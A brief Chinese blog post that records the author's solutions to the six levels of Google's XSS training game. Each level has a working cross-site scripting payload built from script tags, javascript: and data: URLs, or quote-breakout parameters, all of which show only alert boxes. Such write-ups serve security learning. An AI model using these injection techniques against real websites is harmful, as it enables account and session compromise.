---
title: "Google XSS"
gitinfo: true
share: true
comments: true
slug: "google_xss"
images: ["https://cdn.jsdelivr.net/gh/Borber/PublicPic1/headImg/head.png"] 
description: "挺好玩的"
tags: ["XSS", "WEB安全"]
date: 2020-06-14T12:01:04+08:00
---

记录

[谷歌 XSS 小游戏](https://xss-game.appspot.com/)

1. 第一关

   ```html
   </b><script>alert("Borber")</script>
   ```

2. 第二关

   ```html
   <p>hello <a name="n" href="javascript:alert('Borber')"><em>Borber</em></a></p>
   ```

3. 第三关

   ```html
   https://xss-game.appspot.com/level3/frame#4'><script>alert("Borber")</script>
   ```

4. 第四关

   ```html
   https://xss-game.appspot.com/level4/frame?timer=100'),alert('Borber
   ```

5. 第五关

   ```html
   https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("Borber")
   ```

6. 第六关

   ```html
   https://xss-game.appspot.com/level6/frame#data:text/plain,alert("Borber")
   ```

   